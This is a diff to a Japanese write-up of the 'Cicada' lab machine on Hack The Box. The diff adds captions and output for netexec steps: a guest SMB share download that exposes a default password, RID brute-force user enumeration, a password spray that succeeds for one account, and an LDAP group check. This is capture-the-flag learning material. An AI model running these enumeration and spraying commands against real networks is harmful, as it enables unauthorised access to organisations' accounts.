@@ -68,7 +68,7 @@ SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] File size max:        1.
     }
 }  
 ```
-テキストファイルを確認
+テキストファイル内にデフォルトパスワードを発見
 ```sh
 └─$ netexec smb 10.129.231.149 -u ' ' -p '' --share HR --get-file 'Notice from HR.txt' '/home/kali/Notice_from_HR.txt'
 SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
@@ -101,7 +101,7 @@ Thank you for your attention to this matter, and once again, welcome to the Cica
 Best regards,
 Cicada Corp
 ```
-ridブルート実施
+ユーザを列挙するために、ridブルート実施
 ```sh
 └─$ netexec smb 10.129.231.149 -u ' ' -p '' --rid-brute --log temp.txt
 SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
@@ -139,11 +139,11 @@ SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious 
 SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
 SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
 ```
-パスワードスプレー実施、
+パスワードスプレー実施、michael.wrightsonでログイン成功を確認
 ```sh
 └─$ grep 'SidTypeUser' temp.txt | awk '{print $13}' | sed 's/CICADA\\//' > users.txt
 
-└─$ netexec smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+└─$ netexec smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
 SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
 SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
@@ -152,4 +152,16 @@ SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Ci
 SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
 ```
+しかしmichael.wrightsonでは、winrmログインできないもよう
+```sh
+└─$ netexec ldap 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --groups 'Remote Management Users'
+LDAP        10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
+LDAP        10.129.231.149  389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.129.231.149  389    CICADA-DC        Emily Oscars
+```
+
+
+## STEP 3
